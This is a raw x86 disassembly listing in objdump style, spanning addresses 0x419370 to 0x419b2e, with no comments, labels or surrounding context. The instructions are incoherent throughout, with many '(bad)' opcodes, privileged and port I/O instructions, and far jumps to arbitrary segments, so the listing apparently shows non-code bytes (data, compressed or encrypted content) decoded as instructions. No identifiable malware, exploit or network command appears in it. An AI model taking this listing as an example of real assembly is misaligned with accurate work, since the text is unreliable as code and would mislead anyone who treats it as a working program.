  419370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419372:	pop    ds
  419373:	outs   dx,DWORD PTR ds:[esi]
  419374:	pop    esp
  419375:	ins    DWORD PTR es:[edi],dx
  419376:	repnz hlt 
  419378:	push   cs
  419379:	call   ebp
  41937b:	test   BYTE PTR [esp+edi*2-0x5b0abd7],0x6
  419383:	mov    ah,0xca
  419385:	je     0x419354
  419387:	and    bh,BYTE PTR [ecx-0x7]
  41938a:	pop    ebx
  41938b:	dec    si
  41938d:	frstor [edx+0x1e99199b]
  419393:	pop    ss
  419394:	mov    DWORD PTR [ebx],edx
  419396:	lock inc eax
  419398:	pop    ebp
  419399:	dec    edi
  41939a:	jo     0x4193d9
  41939c:	jnp    0x41939e
  41939e:	stos   BYTE PTR es:[edi],al
  41939f:	inc    esi
  4193a0:	jmp    0x419322
  4193a2:	cmp    eax,0xec80972
  4193a7:	cdq    
  4193a8:	pop    ebp
  4193a9:	jo     0x419391
  4193ab:	and    al,0x29
  4193ad:	jmp    0x5fff:0xfd797bbc
  4193b4:	push   es
  4193b5:	jg     0x419404
  4193b7:	mov    al,ds:0x83c3a39d
  4193bc:	je     0x41943b
  4193be:	test   WORD PTR [edx+0x22eed398],dx
  4193c5:	jnp    0x419351
  4193c7:	(bad)  
  4193c8:	adc    esp,DWORD PTR [edi]
  4193ca:	les    ecx,FWORD PTR [edx+ebx*1+0x38]
  4193ce:	adc    dl,BYTE PTR [eax]
  4193d0:	imul   edi,DWORD PTR [ebp+0x78052188],0x77105814
  4193da:	outs   dx,BYTE PTR ds:[esi]
  4193db:	lods   al,BYTE PTR ds:[esi]
  4193dc:	mov    al,bh
  4193de:	inc    ebp
  4193df:	mov    ebx,0xf1a40508
  4193e4:	and    BYTE PTR [eax],bl
  4193e6:	loop   0x419413
  4193e8:	pop    edi
  4193e9:	add    eax,0x8feeb39c
  4193ee:	push   0x5b01c72a
  4193f3:	jnp    0x419389
  4193f5:	ss call 0xe9e503f
  4193fb:	sbb    dl,BYTE PTR [edx]
  4193fd:	fisttp WORD PTR [ecx+edi*8-0x41]
  419401:	mov    al,0xbd
  419403:	pop    edi
  419404:	stos   DWORD PTR es:[edi],eax
  419405:	call   0xfb5ab619
  41940a:	cdq    
  41940b:	je     0x4193c3
  41940d:	jmp    0xeaafaacf
  419412:	aaa    
  419413:	push   cs
  419414:	test   DWORD PTR [eax-0x7aac00dd],edx
  41941a:	xor    edi,eax
  41941c:	jl     0x419430
  41941e:	xchg   ebx,eax
  41941f:	and    al,0x44
  419421:	inc    ebx
  419422:	cmp    DWORD PTR [eax],edx
  419424:	inc    ebp
  419425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419426:	test   eax,0x5ac43628
  41942b:	mov    dl,0xef
  41942d:	xor    DWORD PTR [ecx+eax*1-0x509439ae],ecx
  419434:	jno    0x41949c
  419436:	and    edx,ebp
  419438:	sub    BYTE PTR [edx],dl
  41943a:	lea    esp,ds:0x830eea2e
  419440:	push   es
  419441:	stos   BYTE PTR es:[edi],al
  419442:	adc    al,0x75
  419444:	dec    esi
  419445:	or     ebp,DWORD PTR [ebx-0x6d]
  419448:	mov    al,ds:0x1381f1a6
  41944d:	adc    eax,0xb4478fc5
  419452:	jns    0x419459
  419454:	xchg   BYTE PTR [ebx-0x71],dh
  419457:	fild   WORD PTR [edx+0x7d]
  41945a:	cwde   
  41945b:	js     0x41943e
  41945d:	cmc    
  41945e:	scas   al,BYTE PTR es:[edi]
  41945f:	call   0xfdcc:0x570bdf1e
  419466:	jecxz  0x41948d
  419468:	fidiv  WORD PTR [ecx]
  41946a:	add    al,0x6d
  41946c:	stc    
  41946d:	jb     0x4194ae
  41946f:	sub    DWORD PTR [edi+0x7a],edx
  419472:	stos   DWORD PTR es:[edi],eax
  419473:	jns    0x41940c
  419475:	js     0x419425
  419477:	mov    eax,ds:0x63c71ed8
  41947c:	push   cs
  41947d:	ss mov edx,0x2330bb1c
  419483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419484:	mov    bl,0x3
  419486:	(bad)  
  419487:	out    0x85,eax
  419489:	cmp    cl,cl
  41948b:	rol    DWORD PTR [eax-0x7179649e],0xd6
  419492:	mov    cl,BYTE PTR [ecx]
  419494:	sub    eax,0xa22da23e
  419499:	sub    ah,ch
  41949b:	adc    bl,BYTE PTR [edi+eiz*4]
  41949e:	adc    BYTE PTR [esp+eax*1+0x9895e16],al
  4194a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194a6:	imul   ebx,DWORD PTR [ebp-0x32],0x676c074a
  4194ad:	fwait
  4194ae:	in     al,0x18
  4194b0:	rep lock lods al,BYTE PTR ds:[esi]
  4194b3:	popa   
  4194b4:	std    
  4194b5:	lods   al,BYTE PTR ds:[esi]
  4194b6:	jp     0x419525
  4194b8:	mov    esi,0x16fc23ff
  4194bd:	sar    BYTE PTR [ebx-0x74],1
  4194c0:	cli    
  4194c1:	nop
  4194c2:	or     al,0x89
  4194c4:	mov    edx,0x4cbee5eb
  4194c9:	pop    ss
  4194ca:	cwde   
  4194cb:	pop    esi
  4194cc:	jo     0x4194c3
  4194ce:	adc    edi,0x35
  4194d1:	retf   
  4194d2:	out    dx,al
  4194d3:	mov    bh,0x35
  4194d5:	pop    ds
  4194d6:	call   0x6e8d8002
  4194db:	mov    ch,0x98
  4194dd:	ins    DWORD PTR es:[edi],dx
  4194de:	inc    esp
  4194df:	arpl   WORD PTR [ebx],sp
  4194e1:	int    0xa3
  4194e3:	rol    DWORD PTR [eax+0x40],cl
  4194e6:	add    bl,al
  4194e8:	mov    eax,ds:0x3bd1da29
  4194ed:	mov    WORD PTR [ecx-0x7b4e2c4c],ds
  4194f3:	es cld 
  4194f5:	sbb    eax,0xb833624b
  4194fa:	not    BYTE PTR [esi-0x28]
  4194fd:	pusha  
  4194fe:	inc    esp
  4194ff:	shl    BYTE PTR [ebp+ebp*8+0x4969eba8],cl
  419506:	sbb    eax,0xb2f591f6
  41950b:	pop    eax
  41950c:	cli    
  41950d:	pusha  
  41950e:	push   ss
  41950f:	loop   0x4194d6
  419511:	pop    ds
  419512:	jecxz  0x419501
  419514:	and    eax,0x58b5a04
  419519:	mov    ds:0x78c46636,al
  41951e:	shl    DWORD PTR [edx-0x19],cl
  419521:	fdivr  DWORD PTR [esi-0x2d]
  419524:	inc    edx
  419525:	in     al,dx
  419526:	mov    al,ds:0x8db24b7a
  41952b:	mov    al,ds:0xbde763a
  419530:	pop    edi
  419531:	addr16 xchg edi,eax
  419533:	iret   
  419534:	jp     0x419508
  419536:	sbb    DWORD PTR [esi+0x2ccbf224],eax
  41953c:	sub    dl,BYTE PTR [eax]
  41953e:	enter  0xbac7,0xde
  419542:	out    dx,eax
  419543:	sub    esi,DWORD PTR [eax-0xcea1a86]
  419549:	dec    ecx
  41954a:	push   ebp
  41954b:	jge    0x4195c8
  41954d:	fadd   st(6),st
  41954f:	xchg   ebx,eax
  419550:	jp     0x419550
  419552:	mov    edi,0x33d6cf6a
  419557:	adc    al,BYTE PTR [esi+0x31]
  41955a:	hlt    
  41955b:	or     BYTE PTR [ecx+0x2bb1b1e2],ch
  419561:	pop    ds
  419562:	mov    esp,0x2b8f2354
  419567:	pop    edx
  419568:	inc    esi
  419569:	ss je  0x41955e
  41956c:	std    
  41956d:	(bad)  
  41956f:	push   edx
  419570:	mov    ds:0x605bdd72,al
  419575:	outs   dx,BYTE PTR ds:[esi]
  419576:	xchg   ecx,eax
  419577:	sbb    al,0xaa
  419579:	or     eax,0x4fc0b80a
  41957e:	xchg   DWORD PTR [ebp+0x6d],edx
  419581:	pop    ecx
  419582:	test   eax,0x14062bfa
  419587:	add    ecx,DWORD PTR [eax+0x16233817]
  41958d:	add    ebx,DWORD PTR [ebp-0x15b65928]
  419593:	cwde   
  419594:	sbb    DWORD PTR [ebx],esi
  419596:	jg     0x4195cd
  419598:	xchg   esi,eax
  419599:	xor    edi,esi
  41959b:	xor    ebp,eax
  41959d:	mov    al,ds:0xa1f67c5f
  4195a2:	jle    0x41961e
  4195a4:	push   0x1d688eef
  4195a9:	mov    esi,0xb6451d87
  4195ae:	ss mov esi,0x5723816b
  4195b4:	mov    dh,ah
  4195b6:	into   
  4195b7:	(bad)  
  4195b8:	test   BYTE PTR [ecx-0x57],dl
  4195bb:	sar    edx,cl
  4195bd:	push   esi
  4195be:	jecxz  0x4195a9
  4195c0:	xor    BYTE PTR [edi+0x10],0x4d
  4195c4:	ins    BYTE PTR es:[edi],dx
  4195c5:	sbb    dh,BYTE PTR [edx-0x1e]
  4195c8:	xchg   ebp,eax
  4195c9:	popf   
  4195ca:	and    eax,0x358f8239
  4195cf:	sbb    eax,0x866a98ed
  4195d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195d5:	mov    esp,0x47304f52
  4195da:	adc    ebx,DWORD PTR [edi]
  4195dc:	nop
  4195dd:	js     0x4195ef
  4195df:	nop
  4195e0:	mov    eax,0x500826a0
  4195e5:	ja     0x4195ee
  4195e7:	lahf   
  4195e8:	lahf   
  4195e9:	loopne 0x4195c7
  4195eb:	dec    ebx
  4195ec:	out    0xe7,eax
  4195ee:	jl     0x419667
  4195f0:	fwait
  4195f1:	push   esp
  4195f2:	fucomi st,st(2)
  4195f4:	adc    esp,0x893b59b
  4195fa:	jnp    0x419604
  4195fc:	gs jno 0x419612
  4195ff:	ss enter 0x7a51,0xb
  419604:	jmp    0x82691a10
  419609:	mov    al,ds:0x42d78198
  41960e:	inc    ebp
  41960f:	stos   DWORD PTR es:[edi],eax
  419610:	loopne 0x41959e
  419612:	add    ecx,DWORD PTR [ebx+0x45]
  419615:	call   0xd96b9a86
  41961a:	bound  eax,QWORD PTR [esi-0x46886868]
  419620:	pop    ecx
  419621:	imul   esi,DWORD PTR [eax-0x17001a73],0xffffffba
  419628:	aaa    
  419629:	ror    BYTE PTR [esi+ecx*4+0x3346c1f2],cl
  419630:	je     0x41962f
  419632:	sti    
  419633:	sbb    DWORD PTR ds:0xbfa1c2a2,esi
  419639:	push   0xb013fd25
  41963e:	in     al,dx
  41963f:	in     eax,0x38
  419641:	das    
  419642:	dec    edi
  419643:	scas   eax,DWORD PTR es:[edi]
  419644:	add    ebp,esp
  419646:	or     BYTE PTR ds:0x947115d0,al
  41964c:	ror    BYTE PTR [esi],cl
  41964e:	es fs pop edi
  419652:	loope  0x41960a
  419654:	xlat   BYTE PTR ds:[ebx]
  419655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419656:	and    cl,BYTE PTR [esi+0x76336b26]
  41965c:	push   cs
  41965d:	(bad)  
  41965e:	out    0xb2,eax
  419660:	fldcw  WORD PTR [edi+edi*2-0x56]
  419664:	fild   QWORD PTR [esi]
  419666:	sar    DWORD PTR ds:0x3de91fa4,0x2e
  41966d:	cli    
  41966e:	pusha  
  41966f:	xchg   ebp,eax
  419670:	enter  0x28be,0x54
  419674:	mov    esi,0xd4f61747
  419679:	ds sub al,0xb5
  41967c:	cmp    DWORD PTR [ecx+0x4e7aec03],esi
  419682:	mov    ds:0xdfece24,al
  419687:	xchg   edi,eax
  419688:	and    esi,DWORD PTR [edi]
  41968a:	jecxz  0x4196a5
  41968c:	xchg   ebp,eax
  41968d:	mov    ebp,0xb5c6f50
  419692:	jge    0x4196c0
  419694:	(bad)  
  419695:	dec    ebx
  419696:	(bad)  
  419697:	shr    BYTE PTR [ebp+0x7a],cl
  41969a:	sti    
  41969b:	std    
  41969c:	std    
  41969d:	sub    dl,dh
  41969f:	or     BYTE PTR [ecx],dh
  4196a1:	stos   DWORD PTR es:[edi],eax
  4196a2:	icebp  
  4196a3:	pop    es
  4196a4:	test   al,0xa2
  4196a6:	pusha  
  4196a7:	add    dh,BYTE PTR [edi]
  4196a9:	sub    DWORD PTR [edx],esi
  4196ab:	xor    al,0x81
  4196ad:	fwait
  4196ae:	or     BYTE PTR [esi-0x51],bl
  4196b1:	(bad)  
  4196b3:	stc    
  4196b4:	fcomip st,st(5)
  4196b6:	fstp   QWORD PTR [eax]
  4196b8:	les    edi,FWORD PTR [ebp+0x5d]
  4196bb:	cli    
  4196bc:	sti    
  4196bd:	xchg   ecx,eax
  4196be:	jo     0x419682
  4196c0:	ror    DWORD PTR [ecx-0x4df79822],1
  4196c6:	ins    DWORD PTR es:[edi],dx
  4196c7:	in     eax,0xc7
  4196c9:	out    dx,eax
  4196ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196cb:	pop    edi
  4196cc:	xchg   ecx,eax
  4196cd:	mov    ebp,0x8e7db1e0
  4196d2:	(bad)  
  4196d3:	mov    ah,0x99
  4196d5:	jg     0x419677
  4196d7:	pushf  
  4196d8:	push   edx
  4196d9:	or     ebp,DWORD PTR [ebx]
  4196db:	inc    eax
  4196dc:	ds jmp 0x4196b1
  4196df:	rol    BYTE PTR es:[ebx+0x68],1
  4196e3:	pop    ss
  4196e4:	mov    ds:0x3ca25d1d,al
  4196e9:	imul   DWORD PTR [ebx]
  4196eb:	and    eax,0x3367eba9
  4196f0:	(bad)  [ecx-0x5a]
  4196f3:	inc    esi
  4196f4:	dec    esp
  4196f5:	jmp    0xc90c6d88
  4196fa:	jne    0x4196d0
  4196fc:	sbb    BYTE PTR [esi-0x15],ch
  4196ff:	(bad)  
  419700:	aam    0xa
  419702:	call   0x1853:0x5692ed7c
  419709:	cmp    eax,0x1f0e6e9b
  41970e:	std    
  41970f:	inc    eax
  419710:	push   cs
  419711:	cs daa 
  419713:	loopne 0x4196cd
  419715:	inc    esi
  419716:	sar    BYTE PTR [eax+0x70],cl
  419719:	clc    
  41971a:	jge    0x4196e5
  41971c:	and    ebp,esi
  41971e:	in     eax,dx
  41971f:	outs   dx,DWORD PTR ds:[esi]
  419720:	jnp    0x4196b8
  419722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419723:	lods   eax,DWORD PTR ds:[esi]
  419724:	mov    edx,0x14807068
  419729:	push   edi
  41972a:	adc    BYTE PTR ds:0x986728fb,al
  419730:	xor    edx,DWORD PTR [edx-0x59e2e48]
  419736:	dec    edi
  419737:	repz in eax,0x7d
  41973a:	inc    ecx
  41973b:	mov    edx,0x8d42bce5
  419740:	pop    ebx
  419741:	data16 and cl,al
  419744:	pop    es
  419745:	data16 sahf 
  419747:	dec    edi
  419748:	mov    ecx,0xa895690
  41974d:	xchg   ecx,eax
  41974e:	shr    DWORD PTR [esi],0xfe
  419751:	outs   dx,BYTE PTR ds:[esi]
  419752:	push   ss
  419753:	std    
  419754:	add    al,0x0
  419756:	jns    0x419797
  419758:	ror    DWORD PTR [esi-0x40],0x16
  41975c:	jae    0x419717
  41975e:	cld    
  41975f:	lds    esp,FWORD PTR [ebp+0x56044243]
  419765:	test   al,0x18
  419767:	push   dx
  419769:	pop    es
  41976a:	inc    ecx
  41976b:	call   0xe420:0x9d42c8d3
  419772:	xlat   BYTE PTR ds:[ebx]
  419773:	lahf   
  419774:	adc    ah,BYTE PTR [edx+0x1a3ee6e]
  41977a:	bound  ecx,QWORD PTR [edi+0x0]
  41977d:	push   eax
  41977e:	pop    edx
  41977f:	imul   edx,DWORD PTR [ebx],0x90b0ff40
  419785:	fnstcw WORD PTR [ecx-0x6d]
  419788:	inc    edi
  419789:	ret    0xe7b3
  41978c:	dec    ebx
  41978d:	mov    bl,0x59
  41978f:	(bad)  
  419790:	or     eax,0x986c160e
  419795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419796:	push   0x23d8994
  41979b:	sbb    al,0x64
  41979d:	inc    esi
  41979e:	xor    BYTE PTR [eax-0x6c],dh
  4197a1:	fs inc esi
  4197a3:	add    BYTE PTR [edx+0x28],dh
  4197a6:	inc    eax
  4197a7:	and    DWORD PTR [di-0x77],ecx
  4197ab:	sbb    eax,0xa2f7a471
  4197b0:	das    
  4197b1:	sub    ch,BYTE PTR [esi]
  4197b3:	test   al,0x7a
  4197b5:	mul    DWORD PTR [eax]
  4197b7:	inc    ebx
  4197b8:	inc    ebp
  4197b9:	(bad)  
  4197ba:	aam    0xd4
  4197bc:	daa    
  4197bd:	mov    ecx,0xa0b9a0b7
  4197c2:	sub    DWORD PTR [edi-0x42],esi
  4197c5:	dec    edx
  4197c6:	sub    cl,BYTE PTR [eax]
  4197c8:	js     0x419820
  4197ca:	(bad)  
  4197cb:	dec    eax
  4197cc:	add    ebp,esp
  4197ce:	and    BYTE PTR [ebx-0x40],al
  4197d1:	outs   dx,DWORD PTR ds:[esi]
  4197d2:	xchg   DWORD PTR [esi+eax*2+0x3cdd3700],ebx
  4197d9:	push   cs
  4197da:	in     eax,0xe7
  4197dc:	adc    eax,DWORD PTR [esi+0xbacbbca]
  4197e2:	mov    ds:0x9ba23f53,al
  4197e7:	push   edi
  4197e8:	inc    bl
  4197ea:	loope  0x4197b3
  4197ec:	scas   eax,DWORD PTR es:[edi]
  4197ed:	and    eax,0x68d3ddcc
  4197f2:	sbb    bh,BYTE PTR ds:0x4c111901
  4197f8:	mov    ds:0x22af86af,al
  4197fd:	inc    ebx
  4197fe:	pop    ecx
  4197ff:	mov    dh,0x73
  419801:	mov    DWORD PTR [ecx],0x649c77b7
  419807:	adc    edi,DWORD PTR [edi+0x61]
  41980a:	push   ecx
  41980b:	cmp    eax,0x9ed79c77
  419810:	push   ebp
  419811:	test   edx,0x4fc32fe3
  419817:	mov    eax,0xa1a9875
  41981c:	cmp    ch,BYTE PTR [edx-0x28]
  41981f:	add    ebx,DWORD PTR [ebx]
  419821:	out    0x8e,eax
  419823:	jmp    0x45c0c1d2
  419828:	add    dh,ch
  41982a:	(bad)  
  41982b:	jle    0x4197d9
  41982d:	add    al,0xe2
  41982f:	lea    edi,[eax-0xa]
  419832:	stos   DWORD PTR es:[edi],eax
  419833:	inc    esp
  419834:	fdivr  QWORD PTR [edi+0x12]
  419837:	rcl    BYTE PTR [ecx],1
  419839:	jmp    0x41986c
  41983b:	inc    edi
  41983c:	xchg   ebp,eax
  41983d:	cwde   
  41983e:	sub    DWORD PTR [ecx],ebp
  419840:	mov    eax,ds:0xad9374dc
  419845:	jmp    0xd581a3e5
  41984a:	test   BYTE PTR [edx+0x6],0x37
  41984e:	test   DWORD PTR [edx+ecx*4+0x1da7ee02],esp
  419855:	mov    edx,0xd186cbba
  41985a:	xchg   BYTE PTR [edi-0x21ba1dd1],bl
  419860:	(bad)  
  419861:	cld    
  419862:	sub    BYTE PTR [ebx+0x1b],bl
  419865:	mov    esp,0x2003d35b
  41986a:	in     al,dx
  41986b:	xchg   ebx,eax
  41986c:	inc    edi
  41986d:	not    BYTE PTR [ecx]
  41986f:	lahf   
  419870:	lods   eax,DWORD PTR ds:[esi]
  419871:	jle    0x419889
  419873:	sub    BYTE PTR [eax+ecx*8-0x46fd78f5],0xcf
  41987b:	popa   
  41987c:	mov    gs,ebp
  41987e:	sbb    al,0xb4
  419880:	int    0x8c
  419882:	call   0x488f9f0c
  419887:	jecxz  0x419845
  419889:	jb     0x4198ee
  41988b:	add    al,0x30
  41988d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41988e:	es dec ebp
  419890:	xor    ebx,esi
  419892:	pop    ebp
  419893:	add    eax,0xe49a84e4
  419898:	addr16 nop
  41989a:	mov    cl,0x19
  41989c:	mov    dh,0x7f
  41989e:	push   edi
  41989f:	adc    ch,BYTE PTR [edx]
  4198a1:	jl     0x4198fc
  4198a3:	pop    edx
  4198a4:	test   DWORD PTR [eax],esi
  4198a6:	outs   dx,BYTE PTR ds:[esi]
  4198a7:	xchg   esp,eax
  4198a8:	imul   esi,ebx,0x610a5f47
  4198ae:	adc    cl,BYTE PTR [ebx-0x5b]
  4198b1:	cmp    dh,dl
  4198b3:	inc    edi
  4198b4:	xor    eax,0xc594ef7e
  4198b9:	loop   0x41988c
  4198bb:	mov    es,ebp
  4198bd:	mov    bl,dl
  4198bf:	data16 mov ch,0xb1
  4198c2:	test   BYTE PTR [esi],al
  4198c4:	xchg   ebx,eax
  4198c5:	sub    ebx,DWORD PTR [ebp+0x6c]
  4198c8:	adc    al,0xf7
  4198ca:	xchg   esi,eax
  4198cb:	adc    eax,0x93be2724
  4198d0:	stc    
  4198d1:	push   ss
  4198d2:	inc    edx
  4198d3:	aad    0x75
  4198d5:	sub    eax,0x8cf411b5
  4198da:	orps   xmm6,XMMWORD PTR [eax-0x1faaa34]
  4198e1:	xchg   ebx,eax
  4198e2:	dec    ebx
  4198e3:	retf   
  4198e4:	stc    
  4198e5:	jns    0x419934
  4198e7:	inc    eax
  4198e8:	bound  edx,QWORD PTR [ebx-0x15]
  4198eb:	sbb    ah,BYTE PTR cs:[eax-0x6b41e1f6]
  4198f2:	loop   0x4198c4
  4198f4:	int    0x80
  4198f6:	je     0x419931
  4198f8:	ds jmp 0x419973
  4198fb:	in     al,0xc3
  4198fd:	imul   eax,esi
  419900:	js     0x419967
  419902:	aas    
  419903:	dec    ebx
  419904:	xor    DWORD PTR [ebx+0x11],ebp
  419907:	std    
  419908:	inc    ebp
  419909:	pusha  
  41990a:	pop    DWORD PTR [edi+0x29c90876]
  419910:	xchg   edx,eax
  419911:	inc    ebp
  419912:	pop    esi
  419913:	adc    al,0x80
  419915:	inc    esp
  419916:	dec    ebx
  419917:	push   ss
  419918:	bound  esi,QWORD PTR [ecx-0x43]
  41991b:	jp     0x41990a
  41991d:	cmp    DWORD PTR ds:0xd508e256,eax
  419923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419924:	jg     0x41997d
  419926:	leave  
  419927:	ror    edx,0x30
  41992a:	cmc    
  41992b:	mov    esp,0x193d3860
  419930:	or     al,0x74
  419932:	or     eax,0x1527cacc
  419937:	in     eax,dx
  419938:	outs   dx,BYTE PTR ds:[esi]
  419939:	sub    bl,BYTE PTR [edx-0x685259e3]
  41993f:	fsub   st(6),st
  419941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419942:	jp     0x4198f6
  419944:	mov    ds,esp
  419946:	jnp    0x41994d
  419948:	dec    esi
  419949:	(bad)  
  41994a:	stos   BYTE PTR es:[edi],al
  41994b:	cwde   
  41994c:	shl    BYTE PTR [ebp-0x4a8334c2],cl
  419952:	ja     0x4198fa
  419954:	dec    esp
  419955:	(bad)  
  419956:	or     eax,0x750131ae
  41995b:	xlat   BYTE PTR ds:[ebx]
  41995c:	ror    cl,cl
  41995e:	fstp   st(7)
  419960:	xchg   ebp,eax
  419961:	aaa    
  419962:	pop    esi
  419963:	rcr    DWORD PTR [edx],0xe
  419966:	outs   dx,BYTE PTR ds:[esi]
  419967:	inc    ecx
  419968:	sbb    BYTE PTR [ebp-0x5ddaa7f5],al
  41996e:	es jle 0x41997f
  419971:	sbb    al,0x28
  419973:	in     al,dx
  419974:	dec    eax
  419975:	adc    al,0x8a
  419977:	xchg   edi,eax
  419978:	push   edi
  419979:	cmp    al,0x69
  41997b:	dec    ecx
  41997c:	mov    edx,0x883c8f62
  419981:	dec    edx
  419982:	sbb    edx,DWORD PTR [edi+0xb]
  419985:	lods   al,BYTE PTR ds:[esi]
  419986:	adc    DWORD PTR [edx+0x7e],ebp
  419989:	mov    ah,0xf3
  41998b:	push   eax
  41998c:	mov    edi,0x3f86c5dd
  419991:	das    
  419992:	mov    BYTE PTR [ebx+ebx*4+0x7b0c7ccf],ah
  419999:	jb     0x4199a7
  41999b:	pop    esp
  41999c:	or     dl,BYTE PTR [ebx+0x4114d720]
  4199a2:	les    esi,FWORD PTR [eax+0x78]
  4199a5:	add    bh,BYTE PTR [ebx-0x1d]
  4199a8:	push   es
  4199a9:	jns    0x41993c
  4199ab:	fwait
  4199ac:	les    edx,FWORD PTR [eax-0x5e1275af]
  4199b2:	or     eax,0x79a662d0
  4199b7:	or     al,0x79
  4199b9:	ss fwait
  4199bb:	out    dx,al
  4199bc:	push   esp
  4199bd:	adc    edx,DWORD PTR [edi]
  4199bf:	push   ds
  4199c0:	inc    eax
  4199c1:	pop    edi
  4199c2:	sub    DWORD PTR [eax+esi*1],esp
  4199c5:	test   al,0xb9
  4199c7:	loop   0x419990
  4199c9:	mov    dh,0x79
  4199cb:	jbe    0x419a33
  4199cd:	or     cl,dl
  4199cf:	jmp    0x419a47
  4199d1:	dec    edi
  4199d2:	pop    ebx
  4199d3:	test   al,0xc7
  4199d5:	mov    edx,0x262f6f6c
  4199da:	outs   dx,BYTE PTR ds:[esi]
  4199db:	ins    DWORD PTR es:[edi],dx
  4199dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199dd:	(bad)  
  4199de:	mov    edx,0xd88fbf66
  4199e3:	call   0x9ba486fa
  4199e8:	push   edx
  4199e9:	dec    eax
  4199ea:	fnstsw WORD PTR [eax+ebx*1-0x47]
  4199ee:	enter  0x4adf,0x3f
  4199f2:	xchg   ecx,eax
  4199f3:	xchg   ebx,eax
  4199f4:	das    
  4199f5:	(bad)  
  4199f6:	popf   
  4199f7:	(bad)  
  4199f8:	fcmovnu st,st(6)
  4199fa:	push   edx
  4199fb:	jb     0x4199dd
  4199fd:	div    edx
  4199ff:	and    ah,BYTE PTR [eax]
  419a01:	sbb    dh,BYTE PTR [ecx]
  419a03:	jne    0x419a59
  419a05:	leave  
  419a06:	(bad)  [eax-0x62a2f599]
  419a0c:	xor    al,bh
  419a0e:	inc    ecx
  419a0f:	ret    0x49ad
  419a12:	mov    DWORD PTR [eax],ecx
  419a14:	cmp    al,0x15
  419a16:	xor    di,bx
  419a19:	mov    al,ds:0x4e6f8671
  419a1e:	add    cl,BYTE PTR [edx]
  419a20:	push   0x37
  419a22:	jns    0x4199dd
  419a24:	push   ss
  419a25:	jmp    0x4fce:0x63f1c9bb
  419a2c:	dec    ebp
  419a2d:	and    cl,BYTE PTR [esi-0x2a78d651]
  419a33:	sub    al,ah
  419a35:	push   0x58
  419a37:	jns    0x4199d4
  419a39:	ror    dl,1
  419a3b:	sar    DWORD PTR [edx-0x35],1
  419a3e:	add    DWORD PTR ds:0x95353ae2,0xda7b48a2
  419a48:	pusha  
  419a49:	(bad)  
  419a4a:	mov    ch,BYTE PTR [edi-0x6b]
  419a4d:	or     BYTE PTR cs:[ebx+0x46],bl
  419a51:	mov    cl,0xcf
  419a53:	jno    0x419ad0
  419a55:	pop    ebp
  419a56:	cwde   
  419a57:	xchg   ebp,eax
  419a58:	mov    al,ds:0xfc201bdf
  419a5d:	ins    BYTE PTR es:[edi],dx
  419a5e:	fsub   DWORD PTR [ebx-0x21]
  419a61:	scas   eax,DWORD PTR es:[edi]
  419a62:	sub    BYTE PTR [edx+0x6c4751cf],bl
  419a68:	pop    es
  419a69:	loope  0x419acc
  419a6b:	out    0x3a,eax
  419a6d:	mov    ds:0x9ee29efa,al
  419a72:	and    edx,DWORD PTR [edi]
  419a74:	jmp    0xbf96:0x84cee285
  419a7b:	cdq    
  419a7c:	jmp    0x9ee4:0xa4ad6050
  419a83:	daa    
  419a84:	mov    edx,0x7a70de7d
  419a89:	ins    DWORD PTR es:[edi],dx
  419a8a:	mov    ebx,0xcb2e61be
  419a8f:	ret    
  419a90:	ror    DWORD PTR [ecx+ebx*4-0x144899d7],1
  419a97:	in     eax,dx
  419a98:	xor    DWORD PTR [ecx-0xa],eax
  419a9b:	add    DWORD PTR [ecx-0x3b],esp
  419a9e:	push   ss
  419a9f:	and    dl,BYTE PTR [esi-0x2771ce71]
  419aa5:	std    
  419aa6:	inc    edx
  419aa7:	push   0xffffffec
  419aa9:	inc    ecx
  419aaa:	aas    
  419aab:	sti    
  419aac:	sahf   
  419aad:	call   0xaeb560be
  419ab2:	rol    DWORD PTR [esi+0x74],1
  419ab5:	jmp    0x272a:0x323788f6
  419abc:	lea    ebp,[ebx-0x3f]
  419abf:	into   
  419ac0:	adc    ch,BYTE PTR [edx]
  419ac2:	add    eax,0x5361dc02
  419ac7:	retf   0xd12c
  419aca:	xchg   esp,eax
  419acb:	jnp    0x419a97
  419acd:	cwde   
  419ace:	mov    bh,0x68
  419ad0:	(bad)  
  419ad1:	mov    ds:0xb7d1ed31,al
  419ad6:	out    0xa9,al
  419ad8:	enter  0x93cc,0xf1
  419adc:	xchg   cl,dl
  419ade:	and    ebx,eax
  419ae0:	mov    dh,0x1d
  419ae2:	ss cwde 
  419ae4:	adc    BYTE PTR [ecx+0xdf70233],dh
  419aea:	pop    ss
  419aeb:	inc    ebp
  419aec:	ret    
  419aed:	dec    eax
  419aee:	inc    esp
  419aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419af0:	mov    bh,0x23
  419af2:	das    
  419af3:	add    ecx,DWORD PTR [ecx-0x25e32009]
  419af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419afb:	daa    
  419afc:	fisubr WORD PTR [edx-0x111c2556]
  419b02:	ja     0x419aa3
  419b04:	mov    ebx,DWORD PTR [eax]
  419b06:	fcomp  QWORD PTR [ecx+0x28]
  419b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b0a:	pop    ss
  419b0b:	mov    esi,0x2c6eb1e1
  419b10:	push   ss
  419b11:	pop    esp
  419b12:	sti    
  419b13:	mov    BYTE PTR [edx+ecx*1+0x61b733d1],dl
  419b1a:	retf   0xf3bb
  419b1d:	pop    ebp
  419b1e:	and    eax,0x6852f346
  419b23:	outs   dx,DWORD PTR ds:[esi]
  419b24:	cmp    al,0x83
  419b26:	enter  0xdb58,0xa0
  419b2a:	and    al,0x67
  419b2c:	and    edi,esi
  419b2e:	outs   dx,BYTE PTR ds:[esi]
